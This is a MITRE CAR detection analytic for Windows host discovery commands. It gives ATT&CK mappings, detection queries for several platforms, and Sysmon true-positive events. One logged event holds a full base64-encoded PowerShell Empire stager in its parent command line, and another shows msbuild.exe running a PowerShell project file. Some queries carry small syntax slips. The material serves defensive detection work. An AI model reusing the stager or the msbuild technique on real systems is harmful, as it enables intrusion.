---
title: "CAR-2016-03-001: Host Discovery Commands"
layout: analytic
submission_date: 2016/03/24
information_domain: Host
subtypes: Process
analytic_type: TTP
contributors: MITRE
applicable_platforms: Windows, Linux, macOS
---
<br><br>
When entering on a host for the first time, an adversary may try to [discover](https://attack.mitre.org/tactics/TA0007) information about the host. There are several built-in Windows commands that can be used to learn about the software configurations, active users, administrators, and networking configuration. These commands should be monitored to identify when an adversary is learning information about the system and environment. The information returned may impact choices an adversary can make when [establishing persistence](https://attack.mitre.org/tactics/TA0003), [escalating privileges](https://attack.mitre.org/tactics/TA0004), or [moving laterally](https://attack.mitre.org/tactics/TA0008).

Because these commands are built in, they may be run frequently by power users or even by normal users. Thus, an analytic looking at this information should have well-defined white- or blacklists, and should consider looking at an anomaly detection approach, so that this information can be learned dynamically.

Within the built-in Windows Commands:

-   `hostname`
-   `ipconfig`
-   `net`
-   `quser`
-   `qwinsta`
-   `sc` with flags `query`, `queryex`, `qc`
-   `systeminfo`
-   `tasklist`
-   `dsquery`
-   `whoami`

**Note** `dsquery` is only pre-existing on Windows servers.



### ATT&CK Detections

|Technique|Subtechnique(s)|Tactic(s)|Level of Coverage|
|---|---|---|---|
|[Account Discovery](https://attack.mitre.org/techniques/T1087/)|[Local Account](https://attack.mitre.org/techniques/T1087/001/), [Domain Account](https://attack.mitre.org/techniques/T1087/002/)|[Discovery](https://attack.mitre.org/tactics/TA0007/)|Moderate|
|[Permission Groups Discovery](https://attack.mitre.org/techniques/T1069/)|[Local Groups](https://attack.mitre.org/techniques/T1069/001/), [Domain Groups](https://attack.mitre.org/techniques/T1069/002/)|[Discovery](https://attack.mitre.org/tactics/TA0007/)|Moderate|
|[System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)|N/A|[Discovery](https://attack.mitre.org/tactics/TA0007/)|Moderate|
|[System Information Discovery](https://attack.mitre.org/techniques/T1082/)|N/A|[Discovery](https://attack.mitre.org/tactics/TA0007/)|Moderate|
|[System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/)|N/A|[Discovery](https://attack.mitre.org/tactics/TA0007/)|Moderate|
|[Process Discovery](https://attack.mitre.org/techniques/T1057/)|N/A|[Discovery](https://attack.mitre.org/tactics/TA0007/)|Moderate|
|[System Service Discovery](https://attack.mitre.org/techniques/T1007/)|N/A|[Discovery](https://attack.mitre.org/tactics/TA0007/)|Moderate|


### D3FEND Techniques

|ID|Name|
|---|---| 
|D3-PSA | [Process Spawn Analysis](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis)| 



### Data Model References

|Object|Action|Field|
|---|---|---|
|[process](/data_model/process) | [create](/data_model/process#create) | [command_line](/data_model/process#command_line) |
|[process](/data_model/process) | [create](/data_model/process#create) | [exe](/data_model/process#exe) |



### Implementations

#### Pseudocode

To be effective in deciphering malicious and benign activity, the full command line is essential. Similarly, having information about the parent process can help with making decisions and tuning to an environment.


```
process = search Process:Create
info_command = filter process where (
 exe == "hostname.exe" or
 exe == "ipconfig.exe" or
 exe == "net.exe" or
 exe == "quser.exe" or
 exe == "qwinsta.exe" or
 exe == "sc" and (command_line match " query" or command_line match " qc")) or
 exe == "systeminfo.exe" or
 exe == "tasklist.exe" or
 exe == "whoami.exe"
)
output info_command

```


#### Splunk, Sysmon native

Splunk version of the above pseudocode search.


```
index=__your_sysmon_index__ EventCode=1 (Image="C:\\Windows\\*\\hostname.exe" OR Image="C:\\Windows\\*\\ipconfig.exe" OR Image="C:\\Windows\\*\\net.exe" OR Image="C:\\Windows\\*\\quser.exe" OR Image="C:\\Windows\\*\\qwinsta.exe" OR (Image="C:\\Windows\\*\\sc.exe" AND (CommandLine="* query *" OR CommandLine="* qc *")) OR Image="C:\\Windows\\*\\systeminfo.exe" OR Image="C:\\Windows\\*\\tasklist.exe" OR Image="C:\\Windows\\*\\whoami.exe")|stats values(Image) as "Images" values(CommandLine) as "Command Lines" by ComputerName

```


#### Eql, EQL native

EQL version of the above pseudocode search.


```
process where subtype.create and
  (process_name == "hostname.exe" or process_name == "ipconfig.exe" or process_name == "net.exe" or process_name == "quser.exe" process_name == "qwinsta.exe" or process_name == "systeminfo.exe" or process_name == "tasklist.exe" or process_name == "whoami.exe" or (process_name == "sc.exe" and (command_line == "* query *" or command_line == "* qc *")))

```


#### Logpoint, LogPoint native

LogPoint version of the above pseudocode.


```
norm_id=WindowsSysmon event_id=1 (image in ["*\hostname.exe", "*\ipconfig.exe", "*\net.exe", "*\quser.exe", "*\qwinsta.exe", "*\systeminfo.exe", "*\tasklist.exe", "*\whoami.exe"] OR (image="*\sc.exe" command IN ["* query *", "* qc *"))

```





### True Positives

#### Mordor (sysmon) - net.exe

Sysmon net.exe event from the Mordor [Empire Net Start dataset](https://github.com/hunters-forge/mordor/blob/master/small_datasets/windows/discovery/system_service_discovery_T1007/empire_net_start.md).


##### [Full Event](/true_positives/CAR-2016-03-001-mordor-01.json)


##### Event Snippet
```json
{
	"@event_date_creation": "2019-05-18T22:01:37.466Z",
	"@timestamp": "2019-05-18T22:01:37.485Z",
	"@version": "1",
	"action": "processcreate",
	"event_id": 1,
	"file_company": "Microsoft Corporation",
	"file_description": "Net Command",
	"file_product": "Microsoft® Windows® Operating System",
	"file_version": "10.0.17763.1 (WinBuild.160101.0800)",
	"fingerprint_process_command_line_mm3": 2031073884,
	"hash_imphash": "57F0C47AE2A1A2C06C8B987372AB0B07",
	"hash_md5": "AE61D8F04BCDE8158304067913160B31",
	"hash_sha1": "4F4970C3545972FEA2BC1984D597FC810E6321E0",
	"hash_sha256": "25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369",
	"host_name": "hr001.shire.com",
	"level": "Information",
	"log_ingest_timestamp": "2019-05-18T22:01:37.485Z",
	"log_name": "Microsoft-Windows-Sysmon/Operational",
	"opcode": "Info",
	"process_command_line": "\"c:\\windows\\system32\\net.exe\" start",
	"process_current_directory": "c:\\windows\\system32\\",
	"process_guid": "03ba39f5-80c1-5ce0-0000-0010d7602302",
	"process_id": "6416",
	"process_integrity_level": "Medium",
	"process_name": "net.exe",
	"process_parent_command_line": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" -nop -sta -w 1 -enc  sqbgacgajabqafmavgblahiacwbjae8abgbuaeeaygbmagualgbqafmavgblahiacwbjag8abgauae0ayqbkae8acgagac0arwblacaamwapahsajaa4aeqaqqbjadeapqbbafiarqbmaf0algbbafmacwbfae0aqgbmahkalgbhaguavabuafkauabfacgajwbtahkacwb0aguabqauae0ayqbuageazwblag0azqbuahqalgbbahuadabvag0ayqb0agkabwbuac4avqb0agkababzaccakqauaciarwbfafqargbjaeuayabsaeqaigaoaccaywbhagmaaablagqarwbyag8adqbwafaabwbsagkaywb5afmazqb0ahqaaqbuagcacwanacwajwboaccakwanag8abgbqahuaygbsagkaywasafmadabhahqaaqbjaccakqa7aekargaoacqaoabeaeeaqwaxackaewakadmamgbladqarga9acqaoabkaeeaqwaxac4arwblahqavgbbagwadqblacgajabuahuatabmackaowbjaeyakaakadmamgbfadqargbbaccauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwbdackaewakadmamgbladqargbbaccauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwbdafsajwbfag4ayqbiagwazqbtagmacgbpahaadabcaccakwanagwabwbjagsatabvagcazwbpag4azwanaf0apqawadsajaazadiarqa0agyawwanafmaywbyagkacab0aeiajwaraccababvagmaawbmag8azwbnagkabgbnaccaxqbbaccarqbuageaygbsaguauwbjahiaaqbwahqaqgbsag8aywbraekabgb2ag8aywbhahqaaqbvag4atabvagcazwbpag4azwanaf0apqawah0ajab2ageabaa9afsaqwbvagwatablagmavabjag8abgbtac4arwbfag4arqbsagkaqwauaeqasqbjafqaaqbpag4aqqbyahkawwbtahqacgbpag4arwasafmaeqbtahqazqbnac4atwbiaeoazqbjafqaxqbdadoaogbuaguavwaoackaowakahyayqbmac4aqqbkagqakaanaeuabgbhagiabablafmaywbyagkacab0aeiajwaraccababvagmaawbmag8azwbnagkabgbnaccalaawackaowakafyaqqbmac4aqqbeaeqakaanaeuabgbhagiabablafmaywbyagkacab0aeiababvagmaawbjag4adgbvagmayqb0agkabwbuaewabwbnagcaaqbuagcajwasadaakqa7acqamwayaeuanabmafsajwbiaesarqbzaf8atabpaemaqqbmaf8atqbbaemasabjae4arqbcafmabwbmahqadwbhahiazqbcafaabwbsagkaywbpaguacwbcae0aaqbjahiabwbzag8azgb0afwavwbpag4azabvahcacwbcafaabwb3aguacgbtaggazqbsagwaxabtagmacgbpahaadabcaccakwanagwabwbjagsatabvagcazwbpag4azwanaf0apqakafyaqqbsah0arqbmafmarqb7afsauwbdahiaaqbwafqaqgbmae8aywbraf0algaiaecazqbuaeyaaqbfagaababkaciakaanahmaaqbnag4ayqb0ahuacgblahmajwasaccatganacsajwbvag4auab1agiababpagmalabtahqayqb0agkaywanackalgbtaeuadabwaeeatabvaguakaakag4avqbmaewalaaoae4azqb3ac0atwbiagoarqbdafqaiabdae8ababmaeuaqwbuaekabwboahmalgbhaeuabgblafiasqbdac4asabbafmasabtaguadabbahmadabyaekabgbnaf0akqapah0ajabsaeuarga9afsaugblagyaxqauaeeacwbtaguatqbcaewaeqauaecazqbuafqawqbwaeuakaanafmaeqbzahqazqbtac4atqbhag4ayqbnaguabqblag4adaauaeeadqb0ag8abqbhahqaaqbvag4algbbag0acwbpafuadabpagwacwanackaowakafiazqbgac4arwblahqargbpaeuababkacgajwbhag0acwbpaekabgbpahqargbhagkabablagqajwasaccatgbvag4auab1agiababpagmalabtahqayqb0agkaywanackalgbtaeuavabwaeeababvaeuakaakae4adqbsagwalaakahqacgb1aeuakqa7ah0aowbbafmaeqbtafqarqbnac4atgblahqalgbtaeuacgbwagkaqwbfafaatwbjag4adabnageatgbbaecarqbsaf0aoga6aeuaeabqaeuaqwbuadeamaawaematwbuafqaaqbuafuarqa9adaaowakadqamwbfagyamwa9ae4arqb3ac0atwbiaeoarqbjafqaiabtahkacwb0aeuabqauae4azqb0ac4avwblagiaqwbsaekazqboahqaowakahuapqanae0abwb6agkababsagealwa1ac4amaagacgavwbpag4azabvahcacwagae4avaagadyalgaxadsaiabxae8avwa2adqaowagafqacgbpagqazqbuahqalwa3ac4amaa7acaacgb2adoamqaxac4amaapacaababpagsazqagaecazqbjagsabwanadsawwbtahkacwb0aguabqauae4azqb0ac4auwblahiadgbpagmazqbqag8aaqbuahqatqbhag4ayqbnaguacgbdadoaogbtaguacgb2aguacgbdaguacgb0agkazgbpagmayqb0aguavgbhagwaaqbkageadabpag8abgbdageababsagiayqbjagsaiaa9acaaewakahqacgb1aguafqa7acqanaazaguazgazac4asabfageazablafiacwauaeeazabeacgajwbvahmazqbyac0aqqbnaguabgb0accalaakahuakqa7acqanaazaguargazac4asablageazablahiacwauaeearabkacgajwbvahmazqbyac0aqqbnaguabgb0accalaakahuakqa7acqanaazaguazgazac4auabyag8aeab5ad0awwbtafkauwb0aguatqauae4azqb0ac4avwbfaeiaugblaheadqblahmavabdadoaogbeaeuargbhafuabab0afcazqbcafaaugbpafgaeqa7acqanaazaguazgazac4auabsag8aeab5ac4aqwbsaguazabfag4avabpageababtacaapqagafsauwbzahmavablag0algboaguadaauaemacgblagqarqbuahqasqbbaewaqwbhagmaaablaf0aoga6aeqarqbgaeeadqbmahqatgblafqadwbpafiaswbdahiarqbeaguabgb0agkayqbmahmaowakafmaywbyagkacab0adoauabyag8aeab5acaapqagacqanaazaguazgazac4auabyag8aeab5adsajablad0awwbtahkacwbuaguabqauafqazqb4afqalgbfag4aywbvagqaaqboaecaxqa6adoaqqbtaemasqbjac4arwbfafqaqgbzahqarqbtacgajwb+agsakgbfaeyauwbqahiaoaalahgadwblaeoangboahwauablac4azgb7afuatgbnaegadqbkahaanqb5ag0ajwapadsajabsad0aewakaeqalaakaesapqakaeeacgbhahmaowakafmapqawac4algayaduanqa7adaalgauadianqa1ahwajqb7acqasga9acgajabkacsajabtafsajabfaf0akwakaesawwakaf8ajqakaesalgbdae8adqbuafqaxqapacuamga1adyaowakafmawwakaf8axqasacqauwbbacqasgbdad0ajabtafsajabkaf0alaakafmawwakaf8axqb9adsajabeahwajqb7acqasqa9acgajabjacsamqapacuamga1adyaowakaegapqaoacqasaaracqauwbbacqasqbdackajqayaduanga7acqauwbbacqasqbdacwajabtafsajabiaf0apqakafmawwakaegaxqasacqauwbbacqasqbdadsajabfac0aygb4ae8acgakafmawwaoacqauwbbacqasqbdacsajabtafsajabiaf0akqaladianqa2af0afqb9adsajabzaguacga9acqakabbafqazqbyahqalgbfae4aqwbvaeqasqboaecaxqa6adoavqboagkaywbpaeqazqauaecarqb0afmadabyagkatgbhacgawwbdae8atgb2aguacgbuaf0aoga6aeyaugbvag0aqgbbahmarqa2adqauwb0afiaaqboagcakaanageaqqbcadaaqqbiafeaqqbjaeeaqgb6aeearabvaeeatab3aeeadgbbaeqarqbbae0aqqbbahuaqqbeaeeaqqbmagcaqqb4aeearabbaeeatabnaeeaeabbaeqaqqbbae4azwbbad0ajwapackakqa7acqadaa9accalwbuaguadwbzac4acaboahaajwa7acqanaazaeuazgazac4asablaeeazabfahiauwauaeeazabeacgaigbdag8abwbragkazqaiacwaigbiafkadgbsafaasgbnag0acwbrahkatgbgafqaawa9ahoabwbqadaadgbdae0atwbsafyazqbyadiargbjafmazgbpaeyaawbsaemaagbsahiaoabjad0aigapadsajabeageavabhad0ajaa0admarqbmadmalgbeae8adwbuagwabwbbaeqarabbafqayqaoacqauwblahiakwakafqakqa7acqaaqb2ad0ajabeageavabbafsamaauac4amwbdadsajabeaeeadabbad0ajabkaeeavabbafsanaauac4ajabkaeeadabbac4abablae4arwb0aegaxqa7ac0aagbvagkabgbbaemasabhahiawwbdaf0akaamacaajabsacaajabeaeeadabhacaakaakaekavgaracqaswapackafabjaeuawaa=",
	"process_parent_guid": "03ba39f5-6e79-5ce0-0000-001032d21002",
	"process_parent_id": "5204",
	"process_parent_name": "powershell.exe",
	"process_parent_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
	"process_path": "c:\\windows\\system32\\net.exe",
	"provider_guid": "5770385f-c22a-43e0-bf4c-06f5698ffbd9",
	"record_number": "2266298",
	"source_name": "Microsoft-Windows-Sysmon",
	"task": "Process Create (rule: ProcessCreate)",
	"thread_id": 3144,
	"type": "wineventlog",
	"user_account": "shire\\pgustavo",
	"user_domain": "shire",
	"user_logon_guid": "03ba39f5-6e77-5ce0-0000-00208da31002",
	"user_logon_id": 34644877,
	"user_name": "pgustavo",
	"user_reporter_domain": "NT AUTHORITY",
	"user_reporter_name": "SYSTEM",
	"user_reporter_sid": "S-1-5-18",
	"user_reporter_type": "User",
	"user_session_id": "1",
	"version": 5
}
```


#### Mordor (sysmon) - whoami.exe

Sysmon whoami.exe event from the Mordor [Empire Net Start dataset](https://github.com/hunters-forge/mordor/blob/master/small_datasets/windows/discovery/system_service_discovery_T1007/empire_net_start.md).


##### [Full Event](/true_positives/CAR-2016-03-001-mordor-02.json)


##### Event Snippet
```json
{
	"@event_date_creation": "2019-05-18T21:40:45.541Z",
	"@timestamp": "2019-05-18T21:40:45.584Z",
	"@version": "1",
	"action": "processcreate",
	"event_id": 1,
	"file_company": "Microsoft Corporation",
	"file_description": "whoami - displays logged on user information",
	"file_product": "Microsoft® Windows® Operating System",
	"file_version": "10.0.17763.1 (WinBuild.160101.0800)",
	"fingerprint_process_command_line_mm3": 2899086180,
	"hash_imphash": "7FF0758B766F747CE57DFAC70743FB88",
	"hash_md5": "43C2D3293AD939241DF61B3630A9D3B6",
	"hash_sha1": "47D7864D26FC67E0D60391CBF170D33DA518C322",
	"hash_sha256": "1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A",
	"host_name": "it001.shire.com",
	"level": "Information",
	"log_ingest_timestamp": "2019-05-18T21:40:45.584Z",
	"log_name": "Microsoft-Windows-Sysmon/Operational",
	"process_command_line": "\"c:\\windows\\system32\\whoami.exe\"",
	"process_current_directory": "c:\\windows\\tasks\\",
	"process_guid": "aa6b4a20-7bdd-5ce0-0000-001047551d00",
	"process_id": "2088",
	"process_integrity_level": "High",
	"process_name": "whoami.exe",
	"process_parent_command_line": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\msbuild.exe  c:\\windows\\tasks\\pshell.xml",
	"process_parent_guid": "aa6b4a20-7b8d-5ce0-0000-001028031c00",
	"process_parent_id": "5656",
	"process_parent_name": "msbuild.exe",
	"process_parent_path": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\msbuild.exe",
	"process_path": "c:\\windows\\system32\\whoami.exe",
	"provider_guid": "5770385f-c22a-43e0-bf4c-06f5698ffbd9",
	"record_number": "2994778",
	"source_name": "Microsoft-Windows-Sysmon",
	"task": "Process Create (rule: ProcessCreate)",
	"thread_id": 2136,
	"type": "wineventlog",
	"user_account": "shire\\pgustavo",
	"user_domain": "shire",
	"user_logon_guid": "aa6b4a20-7b8c-5ce0-0000-002071cb1b00",
	"user_logon_id": 1821553,
	"user_name": "pgustavo",
	"user_reporter_domain": "NT AUTHORITY",
	"user_reporter_name": "SYSTEM",
	"user_reporter_sid": "S-1-5-18",
	"user_reporter_type": "User",
	"user_session_id": "0",
	"version": 5
}
```

